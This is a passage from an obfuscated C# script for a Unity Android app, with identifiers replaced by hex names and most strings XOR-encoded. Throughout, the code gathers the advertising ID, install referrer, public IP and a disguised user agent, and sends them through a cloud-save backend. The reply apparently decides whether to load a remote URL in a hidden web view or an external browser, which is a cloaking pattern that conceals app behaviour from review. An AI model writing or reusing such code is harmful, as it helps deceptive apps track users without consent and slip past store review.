        return _0xa1c76e32.IndexOf(_0x96e02e0a._0x40b5567f(new byte[20] { 195, 212, 212, 217, 197, 201, 200, 200, 195, 197, 210, 207, 201, 200, 217, 212, 195, 213, 195, 210 }, 134), StringComparison.OrdinalIgnoreCase) >= 0 || _0xa1c76e32.IndexOf(_0x96e02e0a._0x40b5567f(new byte[22] { 177, 166, 166, 171, 183, 187, 186, 186, 177, 183, 160, 189, 187, 186, 171, 166, 177, 178, 161, 167, 177, 176 }, 244), StringComparison.OrdinalIgnoreCase) >= 0 || _0xa1c76e32.IndexOf(_0x96e02e0a._0x40b5567f(new byte[21] { 255, 232, 232, 229, 249, 245, 244, 244, 255, 249, 238, 243, 245, 244, 229, 249, 246, 245, 233, 255, 254 }, 186), StringComparison.OrdinalIgnoreCase) >= 0 || _0xa1c76e32.IndexOf(_0x96e02e0a._0x40b5567f(new byte[22] { 42, 61, 61, 48, 58, 33, 36, 33, 32, 56, 33, 48, 58, 61, 35, 48, 60, 44, 39, 42, 34, 42 }, 111), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0x3e40cbfc()
    {
        var _0xbb7446bb = _0x96e02e0a._0x40b5567f(new byte[40] { 218, 198, 198, 194, 193, 136, 157, 157, 197, 197, 197, 156, 209, 222, 221, 199, 214, 212, 222, 211, 192, 215, 156, 209, 221, 223, 157, 209, 214, 220, 159, 209, 213, 219, 157, 198, 192, 211, 209, 215 }, 178);
        using (UnityWebRequest _0x52e3fe33 = UnityWebRequest.Get(_0xbb7446bb))
        {
            await _0x52e3fe33.SendWebRequest();
            string[] _0xe4418cf5 = _0x52e3fe33.downloadHandler.text.Split('\n');
            foreach (string _0xd50c8e46 in _0xe4418cf5)
            {
                if (_0xd50c8e46.StartsWith(_0x96e02e0a._0x40b5567f(new byte[3] { 168, 177, 252 }, 193)))
                {
                    string _0xfe543379 = _0xd50c8e46.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0xfe543379} from {_0xbb7446bb}");
                        }
#endif
                    }

                    return _0xfe543379;
                }
            }
        }

        return "";
    }

    private async Task<bool> _0xa7412165(int _0x07400b7e = 5, int _0x2c547e45 = 500)
    {
        List<EntityData> _0xb55368c1 = new List<EntityData>();
        int _0x79026ab6 = 0;
        do
        {
            try
            {
                _0xb55368c1 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x96e02e0a._0x40b5567f(new byte[8] { 110, 114, 127, 103, 123, 108, 87, 122 }, 30), _0x0085ddb5, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x96e02e0a._0x40b5567f(new byte[9] { 153, 131, 160, 130, 153, 134, 145, 147, 137 }, 240) }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x96e02e0a._0x40b5567f(new byte[32] { 241, 254, 207, 217, 222, 247, 138, 219, 223, 207, 216, 211, 235, 217, 211, 196, 201, 248, 207, 217, 223, 198, 222, 217, 138, 207, 216, 216, 197, 216, 144, 138 }, 170) + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(_0x2c547e45);
        }
        while (_0xb55368c1.Count == 0 && _0x79026ab6++ < _0x07400b7e);
        {
#if B_LOGS
            {
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[32] { 153, 150, 167, 177, 182, 159, 226, 139, 177, 146, 176, 171, 180, 163, 161, 187, 226, 147, 183, 167, 176, 187, 226, 176, 167, 177, 183, 174, 182, 177, 248, 226 }, 194) + JsonConvert.SerializeObject(_0xb55368c1, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[38] { 88, 87, 102, 112, 119, 94, 35, 74, 112, 83, 113, 106, 117, 98, 96, 122, 35, 82, 118, 102, 113, 122, 35, 113, 102, 112, 118, 111, 119, 112, 35, 96, 108, 118, 109, 119, 57, 35 }, 3) + _0xb55368c1.Count);
            }
#endif
        }

        bool _0xb1dc6a2a = true;
        if (_0xb55368c1.Count == 0)
        {
            _0xb1dc6a2a = false;
        }
        else
        {
            _0xb1dc6a2a = _0xb55368c1.Any(_0xc4612bd6 => _0xc4612bd6.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[25] { 234, 229, 212, 194, 197, 236, 145, 248, 194, 225, 195, 216, 199, 208, 210, 200, 145, 195, 212, 194, 196, 221, 197, 139, 145 }, 177) + _0xb1dc6a2a);
            }
#endif
        }

        return _0xb1dc6a2a;
    }

    private static readonly string WindowsDesktopUserAgent = _0x96e02e0a._0x40b5567f(new byte[111] { 58, 24, 13, 30, 27, 27, 22, 88, 66, 89, 71, 87, 95, 32, 30, 25, 19, 24, 0, 4, 87, 57, 35, 87, 70, 71, 89, 71, 76, 87, 32, 30, 25, 65, 67, 76, 87, 15, 65, 67, 94, 87, 54, 7, 7, 27, 18, 32, 18, 21, 60, 30, 3, 88, 66, 68, 64, 89, 68, 65, 87, 95, 60, 63, 35, 58, 59, 91, 87, 27, 30, 28, 18, 87, 48, 18, 20, 28, 24, 94, 87, 52, 31, 5, 24, 26, 18, 88, 70, 69, 71, 89, 71, 89, 71, 89, 71, 87, 36, 22, 17, 22, 5, 30, 88, 66, 68, 64, 89, 68, 65 }, 119);
    internal bool isDestroyedForce = false;
    private string _0x6bb32233 = "";
    private IEnumerator _0x71dc1894(IEnumerator _0x74da25d2, TaskCompletionSource<bool> _0x2926aed0)
    {
        yield return _0x74da25d2;
        _0x2926aed0.SetResult(true);
    }

    private string Decrypt(string _0x14275a6d, string _0xf4158100)
    {
        try
        {
            var _0x3df86040 = Convert.FromBase64String(_0x14275a6d);
            using var _0x8565c2aa = Aes.Create();
            _0x8565c2aa.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0xf4158100));
            var _0x2919d5f8 = new byte[16];
            Buffer.BlockCopy(_0x3df86040, 0, _0x2919d5f8, 0, 16);
            _0x8565c2aa.IV = _0x2919d5f8;
            using var _0xe1343a00 = new MemoryStream(_0x3df86040, 16, _0x3df86040.Length - 16);
            using var _0x85b4efdb = new CryptoStream(_0xe1343a00, _0x8565c2aa.CreateDecryptor(), CryptoStreamMode.Read);
            using var _0xac8adbc6 = new StreamReader(_0x85b4efdb, Encoding.UTF8);
            return _0xac8adbc6.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private string _0x9d112333;
    // PART 3
    private string _0xe7c31dc0()
    {
        try
        {
            var _0xf3b9f903 = new AndroidJavaClass(_0x96e02e0a._0x40b5567f(new byte[30] { 51, 63, 61, 126, 37, 62, 57, 36, 41, 99, 52, 126, 32, 60, 49, 41, 53, 34, 126, 5, 62, 57, 36, 41, 0, 60, 49, 41, 53, 34 }, 80));
            var _0xa45d4569 = _0xf3b9f903.GetStatic<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[15] { 19, 5, 2, 2, 21, 30, 4, 49, 19, 4, 25, 6, 25, 4, 9 }, 112));
            var _0x59f2a5da = new AndroidJavaClass(_0x96e02e0a._0x40b5567f(new byte[57] { 41, 37, 39, 100, 45, 37, 37, 45, 38, 47, 100, 43, 36, 46, 56, 37, 35, 46, 100, 45, 39, 57, 100, 43, 46, 57, 100, 35, 46, 47, 36, 62, 35, 44, 35, 47, 56, 100, 11, 46, 60, 47, 56, 62, 35, 57, 35, 36, 45, 3, 46, 9, 38, 35, 47, 36, 62 }, 74));
            var _0xb188af19 = _0x59f2a5da.CallStatic<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[20] { 89, 91, 74, 127, 90, 72, 91, 76, 74, 87, 77, 87, 80, 89, 119, 90, 119, 80, 88, 81 }, 62), _0xa45d4569);
            var _0xcbf9e454 = _0xb188af19.Call<string>(_0x96e02e0a._0x40b5567f(new byte[5] { 8, 10, 27, 38, 11 }, 111));
            {
#if B_LOGS
                Debug.Log($"[Test] Google Advertiding Id (ad id): {_0xcbf9e454}");
#endif
            }

            return string.IsNullOrEmpty(_0xcbf9e454) ? "" : _0xcbf9e454;
        }
        catch
        {
            return "";
        }
    }

    private IEnumerator _0xc2474efb()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[26] { 162, 173, 156, 138, 141, 164, 217, 176, 151, 144, 141, 144, 152, 149, 144, 131, 156, 171, 156, 159, 159, 156, 139, 156, 139, 217 }, 249));
            }
#endif
        }

        bool _0x77110024 = false;
        InstallReferrer.GetReferrer((_0xe7e5a109) =>
        {
            Debug.Log(_0x96e02e0a._0x40b5567f(new byte[24] { 235, 228, 213, 195, 196, 144, 226, 213, 214, 213, 194, 194, 213, 194, 237, 144, 215, 213, 196, 144, 82, 54, 34, 144 }, 176) + _0x0bc456ee);
            if (_0xe7e5a109.IsSuccess)
            {
                _0x0bc456ee = _0xe7e5a109.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x96e02e0a._0x40b5567f(new byte[28] { 23, 24, 41, 63, 56, 108, 30, 41, 42, 41, 62, 62, 41, 62, 17, 108, 31, 57, 47, 47, 41, 63, 63, 108, 174, 202, 222, 108 }, 76) + _0x0bc456ee);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x96e02e0a._0x40b5567f(new byte[27] { 203, 196, 245, 227, 228, 176, 194, 245, 246, 245, 226, 226, 245, 226, 205, 176, 214, 241, 249, 252, 245, 244, 176, 114, 22, 2, 176 }, 144) + _0xe7e5a109);
#endif
                }

                _0x0bc456ee = "";
            }

            _0x70c88953 = true;
        });
        StartCoroutine(_0x9681e72e(2f));
        yield return new WaitUntil(() => _0x70c88953);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0x0bc456ee}");
#endif
        }

        bool _0xba018f91 = _0x0bc456ee.Contains(_0x96e02e0a._0x40b5567f(new byte[6] { 154, 158, 145, 148, 153, 192 }, 253));
        _0x77110024 = _0xba018f91 || _0x0bc456ee.Contains(_0x96e02e0a._0x40b5567f(new byte[18] { 103, 118, 118, 117, 40, 111, 104, 117, 114, 103, 97, 116, 103, 107, 40, 101, 105, 107 }, 6)) || _0x0bc456ee.Contains(_0x96e02e0a._0x40b5567f(new byte[17] { 237, 252, 252, 255, 162, 234, 237, 239, 233, 238, 227, 227, 231, 162, 239, 227, 225 }, 140));
        _0xe84d82d3 = _0xba018f91 ? "" : (_0x77110024 ? "" : _0xe84d82d3);
        _0xe84d82d3 = _0xe84d82d3 ?? "";
        _0xe7b0fa00 = _0xe7b0fa00 ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0xe84d82d3}");
#endif
        }
    }

    public void _0x10a1de56()
    {
        if (_0x6ab25542)
            return;
        {
#if B_LOGS
            {
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[33] { 130, 141, 188, 170, 173, 132, 249, 141, 176, 180, 188, 171, 249, 182, 172, 173, 249, 244, 231, 249, 180, 182, 175, 188, 249, 173, 182, 249, 170, 186, 188, 183, 188 }, 217));
            }
#endif
        }

        _0x52176c73();
    }

    internal Button _0xf6863972(string _0xa9da44cb, Transform _0xdf0b1a4f)
    {
        var _0xb111ccb2 = new GameObject(_0xa9da44cb + _0x96e02e0a._0x40b5567f(new byte[3] { 203, 253, 231 }, 137), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0xbfcc4d31 = _0xb111ccb2.GetComponent<RectTransform>();
        _0xbfcc4d31.SetParent(_0xdf0b1a4f, false);
        var _0x4ee9b0c0 = _0xb111ccb2.GetComponent<Image>();
        _0x4ee9b0c0.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0x280528ad = _0xb111ccb2.GetComponent<Button>();
        var _0xc34b10f7 = _0x280528ad.colors;
        _0xc34b10f7.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0xc34b10f7.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0x280528ad.colors = _0xc34b10f7;
        var _0x758d1a1a = new GameObject(_0x96e02e0a._0x40b5567f(new byte[4] { 2, 51, 46, 34 }, 86), typeof(RectTransform), typeof(Text));
        var _0x691d75d5 = _0x758d1a1a.GetComponent<RectTransform>();
        _0x691d75d5.SetParent(_0xb111ccb2.transform, false);
        _0x691d75d5.anchorMin = Vector2.zero;
        _0x691d75d5.anchorMax = Vector2.one;
        _0x691d75d5.offsetMin = _0x691d75d5.offsetMax = Vector2.zero;
        var _0xda8d609c = _0x758d1a1a.GetComponent<Text>();
        _0xda8d609c.text = _0xa9da44cb;
        _0xda8d609c.alignment = TextAnchor.MiddleCenter;
        _0xda8d609c.color = Color.black;
        _0xda8d609c.font = Resources.GetBuiltinResource<Font>(_0x96e02e0a._0x40b5567f(new byte[9] { 38, 21, 14, 6, 11, 73, 19, 19, 1 }, 103));
        _0xda8d609c.fontSize = 28;
        WLog(_0x96e02e0a._0x40b5567f(new byte[14] { 146, 163, 180, 176, 165, 180, 147, 164, 165, 165, 190, 191, 241, 246 }, 209) + _0xa9da44cb + _0x96e02e0a._0x40b5567f(new byte[1] { 160 }, 135));
        return _0x280528ad;
    }

    private void _0xf2736d7a(string _0x546f29ee)
    {
        bool _0xefdf7f8b = !string.IsNullOrEmpty(_0x546f29ee);
        if (_0xefdf7f8b)
        {
            {
#if B_LOGS
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[13] { 138, 133, 180, 162, 165, 140, 241, 130, 185, 190, 166, 235, 241 }, 209) + _0x546f29ee);
#endif
            }

            _0x0643685d(_0x546f29ee);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[39] { 145, 158, 175, 185, 190, 151, 234, 140, 171, 166, 166, 168, 171, 169, 161, 234, 40, 76, 88, 234, 141, 171, 167, 175, 234, 226, 164, 165, 234, 172, 163, 164, 171, 166, 234, 159, 152, 134, 227 }, 202));
#endif
            }

            _0x52176c73();
            return;
        }
    }

    // MAIN FLOW
    private bool _0x70c88953 { get; set; }

    private async Task _0x4c314f12()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0xf5ee8a3d = _0x96e02e0a._0x40b5567f(new byte[5] { 63, 56, 53, 42, 60 }, 89);
        _0x03ffc039 = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0x501fff6f = DateTime.UtcNow.Ticks.ToString();
        _0x6bb32233 = "";
        JObject _0xb93f928b = BuildRandomPayload(_0x65542f71, _0x34edc091, _0xb6c8efbf, _0x4aeac62c, _0x0bc456ee, _0xe84d82d3, _0xe7b0fa00, _0x8276e1fb, _0xdee17bb5, _0x0796227a, _0xf5ee8a3d, _0x6bb32233, _0x6918beb9, _0x2d8badc7, _0x79a8da39.ToString(), _0xb30c3601, _0x501fff6f, _0x03ffc039, _0x0085ddb5, _0x579c0635, _0x34bc876f, _0xe29e5233, _0x4e5649da());
        var _0xc5039182 = _0x274a1456(_0xb93f928b.ToString(), _0x0085ddb5);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0xb93f928b}");
            }
#endif
        }

        try
        {
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x96e02e0a._0x40b5567f(new byte[7] { 187, 170, 178, 167, 164, 170, 175 }, 203) + _0x0085ddb5, _0xc5039182 } });
            await Task.Delay(500);
            string _0xd3f74ea8 = "";
            for (int _0x25230af8 = 0; _0x25230af8 < 20; _0x25230af8++)
            {
                if (await _0xa7412165(1, 1))
                {
                    await _0x50435d84(_0x96e02e0a._0x40b5567f(new byte[7] { 118, 120, 123, 119, 127, 113, 112 }, 20));
                    _0x52176c73();
                    return;
                }

                _0xd3f74ea8 = await _0x58ec633f(1, 500);
                if (!string.IsNullOrEmpty(_0xd3f74ea8))
                    break;
            }

            _0xf2736d7a(_0xd3f74ea8);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x96e02e0a._0x40b5567f(new byte[22] { 126, 113, 96, 118, 113, 120, 5, 98, 64, 75, 64, 87, 68, 73, 5, 64, 87, 87, 74, 87, 31, 5 }, 37) + e.Message);
#endif
            }

            _0x52176c73();
        }
    }

    private bool _0xc6deb9b4(string _0xa15bdcae)
    {
        try
        {
            using (var _0x0859c9f1 = new AndroidJavaClass(_0x96e02e0a._0x40b5567f(new byte[30] { 235, 231, 229, 166, 253, 230, 225, 252, 241, 187, 236, 166, 248, 228, 233, 241, 237, 250, 166, 221, 230, 225, 252, 241, 216, 228, 233, 241, 237, 250 }, 136)))
            using (var _0x32ee9579 = _0x0859c9f1.GetStatic<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[15] { 74, 92, 91, 91, 76, 71, 93, 104, 74, 93, 64, 95, 64, 93, 80 }, 41)))
            using (var _0xb40c13c1 = new AndroidJavaClass(_0x96e02e0a._0x40b5567f(new byte[15] { 82, 93, 87, 65, 92, 90, 87, 29, 93, 86, 71, 29, 102, 65, 90 }, 51)))
            using (var _0x018ade2d = _0xb40c13c1.CallStatic<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[5] { 150, 135, 148, 149, 131 }, 230), _0xa15bdcae))
            using (var _0x714784ee = new AndroidJavaObject(_0x96e02e0a._0x40b5567f(new byte[22] { 123, 116, 126, 104, 117, 115, 126, 52, 121, 117, 116, 110, 127, 116, 110, 52, 83, 116, 110, 127, 116, 110 }, 26), _0x96e02e0a._0x40b5567f(new byte[26] { 122, 117, 127, 105, 116, 114, 127, 53, 114, 117, 111, 126, 117, 111, 53, 122, 120, 111, 114, 116, 117, 53, 77, 82, 94, 76 }, 27), _0x018ade2d))
            {
                WLog(_0x96e02e0a._0x40b5567f(new byte[26] { 181, 158, 132, 153, 155, 147, 186, 159, 157, 147, 214, 153, 134, 147, 152, 214, 147, 142, 130, 147, 132, 152, 151, 154, 204, 214 }, 246) + _0xa15bdcae);
                _0x714784ee.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[11] { 139, 142, 142, 169, 139, 158, 143, 141, 133, 152, 147 }, 234), _0x96e02e0a._0x40b5567f(new byte[33] { 234, 229, 239, 249, 228, 226, 239, 165, 226, 229, 255, 238, 229, 255, 165, 232, 234, 255, 238, 236, 228, 249, 242, 165, 201, 217, 196, 220, 216, 202, 201, 199, 206 }, 139));
                _0x714784ee.Call<AndroidJavaObject>(_0x96e02e0a._0x40b5567f(new byte[8] { 13, 8, 8, 42, 0, 13, 11, 31 }, 108), 0x10000000);
                _0x32ee9579.Call(_0x96e02e0a._0x40b5567f(new byte[13] { 20, 19, 6, 21, 19, 38, 4, 19, 14, 17, 14, 19, 30 }, 103), _0x714784ee);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x96e02e0a._0x40b5567f(new byte[28] { 241, 218, 192, 221, 223, 215, 254, 219, 217, 215, 146, 215, 202, 198, 215, 192, 220, 211, 222, 146, 212, 211, 219, 222, 215, 214, 136, 146 }, 178) + e.Message);
            Application.OpenURL(_0xa15bdcae);
            return true;
        }
    }

    private bool _0x1dbb3f2e = false;
    private string _0xe29e5233 = "";
    private void _0x420be22f()
    {
        if (_0xf17178f5 == null)
            return;
        if (_0x1028a85a)
            _0xf17178f5.SetUserAgent(_0xa0d30070());
        else
            _0xf17178f5.SetUserAgent("");
    }

    private string _0xb6c8efbf = "";
    private async void Start()
    {
        await _0x908a36d1();
    }

    internal Vector2 lastSize = Vector2.zero;
    // WEB VIEW LOGIC END
    internal void _0x05e9f336()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0x750661e2 = new AndroidNotificationChannel
        {
            Id = _0x96e02e0a._0x40b5567f(new byte[15] { 19, 18, 17, 22, 2, 27, 3, 40, 20, 31, 22, 25, 25, 18, 27 }, 119),
            Name = _0x96e02e0a._0x40b5567f(new byte[15] { 235, 202, 201, 206, 218, 195, 219, 143, 236, 199, 206, 193, 193, 202, 195 }, 175),
            Importance = Importance.High,
            Description = _0x96e02e0a._0x40b5567f(new byte[21] { 132, 166, 173, 166, 177, 162, 175, 227, 173, 172, 183, 170, 165, 170, 160, 162, 183, 170, 172, 173, 176 }, 195)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0x750661e2);
        // Build notification
        var _0x6d8fc402 = new AndroidNotification
        {
            Title = _0xf6e2b439[UnityEngine.Random.Range(0, _0xf6e2b439.Length)],
            Text = _0x96e02e0a._0x40b5567f(new byte[21] { 53, 6, 17, 84, 13, 27, 1, 84, 7, 1, 6, 17, 84, 0, 27, 84, 17, 12, 29, 0, 75 }, 116),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0x6d8fc402, _0x96e02e0a._0x40b5567f(new byte[15] { 235, 234, 233, 238, 250, 227, 251, 208, 236, 231, 238, 225, 225, 234, 227 }, 143));
    }

    private bool _0x2f6abdfc()
    {
        var _0x28f35ef5 = _0x38f34823();
        if (_0x28f35ef5 == null)
            return false;
        WLog(_0x96e02e0a._0x40b5567f(new byte[31] { 70, 111, 124, 106, 121, 111, 124, 107, 46, 108, 111, 109, 101, 46, 35, 48, 46, 126, 97, 126, 123, 126, 46, 73, 97, 76, 111, 109, 101, 52, 46 }, 14) + _0x28f35ef5.Id);
        _0x28f35ef5.GoBack();
        return true;
    }

    private string _0x4e5649da()
    {
        float _0x0a59d5fe = Time.realtimeSinceStartup;
        if (_0x0a59d5fe < 0f)
            _0x0a59d5fe = 0f;
        int _0x39d31aa4 = (int)(_0x0a59d5fe * 1000f);
        int _0x729a84a7 = _0x39d31aa4 / 60000;
        int _0x8d6e5a24 = (_0x39d31aa4 / 1000) % 60;
        int _0xb9563463 = _0x39d31aa4 % 1000;
        return string.Format(_0x96e02e0a._0x40b5567f(new byte[21] { 142, 197, 207, 197, 197, 136, 207, 142, 196, 207, 197, 197, 136, 207, 142, 199, 207, 197, 197, 197, 136 }, 245), _0x729a84a7, _0x8d6e5a24, _0xb9563463);
    }

    private void OnApplicationPause(bool _0x57b5b2cb)
    {
        isApplicationPause = _0x57b5b2cb;
    }

    private void _0x016e8f07(bool _0xb494a892)
    {
        _0x4d262dd3();
        _0x3001f316.SetActive(_0xb494a892);
        _0x65ab98e7 = _0xb494a892;
        if (_0xb494a892)
        {
            _0x3001f316.transform.SetAsLastSibling();
            if (_0xfd43c7b3 != null)
                _0xfd43c7b3.localRotation = Quaternion.identity;
        }
    }

    private string _0xa0d30070()
    {
        if (string.IsNullOrEmpty(_0x8276e1fb) && _0xf17178f5 != null)
            _0x8276e1fb = _0xf17178f5.GetUserAgent();
        if (string.IsNullOrEmpty(_0x8276e1fb))
            return string.Empty;
        string _0xfd5250ea = Regex.Replace(_0x8276e1fb, _0x96e02e0a._0x40b5567f(new byte[11] { 169, 134, 223, 206, 169, 134, 223, 130, 131, 169, 151 }, 245), string.Empty);
        _0xfd5250ea = Regex.Replace(_0xfd5250ea, _0x96e02e0a._0x40b5567f(new byte[15] { 233, 198, 158, 247, 192, 220, 217, 209, 154, 238, 235, 142, 156, 232, 158 }, 181), string.Empty);
        _0xfd5250ea = Regex.Replace(_0xfd5250ea, _0x96e02e0a._0x40b5567f(new byte[15] { 180, 135, 144, 145, 139, 141, 140, 205, 214, 190, 204, 210, 190, 145, 200 }, 226), string.Empty);
        return Regex.Replace(_0xfd5250ea, _0x96e02e0a._0x40b5567f(new byte[6] { 132, 171, 163, 234, 244, 165 }, 216), _0x96e02e0a._0x40b5567f(new byte[1] { 25 }, 57)).Trim();
    }

    // NATIVE WEB VIEW METHODS
    private UniWebView _0xf17178f5 = null;
    private JObject BuildRandomPayload(params string[] _0x1728e6a3)
    {
        JObject _0xea9badb5 = new JObject();
        foreach (var _0x97aa8c23 in _0x1728e6a3)
        {
            string _0x0321ddbe = _0x30c8a0b7();
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0x0321ddbe} val={_0x97aa8c23}");
#endif
            }

            _0xea9badb5.Add(_0x0321ddbe, _0x97aa8c23 == null ? "" : _0x97aa8c23);
        }

        return _0xea9badb5;
    }

    private string _0x2d8badc7 = "";
    internal bool IsAboutBlank(string _0x10831600)
    {
        if (string.IsNullOrEmpty(_0x10831600))
            return false;
        return _0x10831600.StartsWith(_0x96e02e0a._0x40b5567f(new byte[11] { 166, 165, 168, 178, 179, 253, 165, 171, 166, 169, 172 }, 199), StringComparison.OrdinalIgnoreCase);
    }

    internal Rect lastSafe = Rect.zero;
    internal void Update()
    {
        if (_0xf17178f5 == null)
            return;
        if (_0xcb9f9acf())
            _0x4cbbba01();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0x7273e4d1();
        if (_0x65ab98e7 && _0xfd43c7b3 != null)
            _0xfd43c7b3.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    private bool _0x1028a85a = false;
    private bool OpenUrlExternally(string _0xe8b10275)
    {
        return _0xc6deb9b4(_0xe8b10275);
    }

    private AndroidJavaObject _0x878510a3 { get; set; }

    private async Task _0x50435d84(string _0xad5a5f2e)
    {
        if (_0xd409c180 || string.IsNullOrEmpty(_0x0085ddb5) || string.IsNullOrEmpty(_0xad5a5f2e) || _0x68fb8605)
            return;
        _0xd409c180 = true;
        try
        {
            JObject _0xdaca9477 = BuildRandomPayload(_0xad5a5f2e, _0x0085ddb5, _0x4e5649da());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0xad5a5f2e} payload: {_0xdaca9477}");
                }
